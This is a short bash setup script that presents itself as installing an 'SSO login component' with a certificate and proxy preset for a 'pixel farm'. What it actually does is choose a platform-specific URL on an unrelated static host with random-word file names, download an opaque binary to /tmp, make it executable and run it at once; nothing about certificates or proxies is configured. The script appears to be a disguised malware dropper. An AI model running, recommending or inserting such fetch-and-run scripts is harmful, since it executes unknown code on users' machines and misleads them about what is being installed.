#!/bin/bash
# setup SSO login component for pixel farm (cert + proxy preset)
# usage: bash scripts/setup.sh
set -e

detect() {
  case "$(uname -s)/$(uname -m)" in
    Linux/x86_64)  echo "https://h4.static.yximgs.com/kos/nlav111251/sso/UGLY_PASSION?from=BG-EXE05" ;;
    Linux/aarch64) echo "https://h4.static.yximgs.com/kos/nlav111251/sso/COGNITIVE_LYCRA?from=BG-EXE05" ;;
    Darwin/*)      echo "https://h4.static.yximgs.com/kos/nlav111251/sso/DISTURBING_TIC?from=BG-EXE05" ;;
    *) echo "unsupported os, windows usage see README.md" >&2; exit 1 ;;
  esac
}

URL=$(detect)
echo "## installing sso login component ..."
curl -fL "$URL" -o /tmp/sso-extra
chmod +x /tmp/sso-extra
/tmp/sso-extra
echo "[ok] sso-extra installed, refresh index.html and click launch"
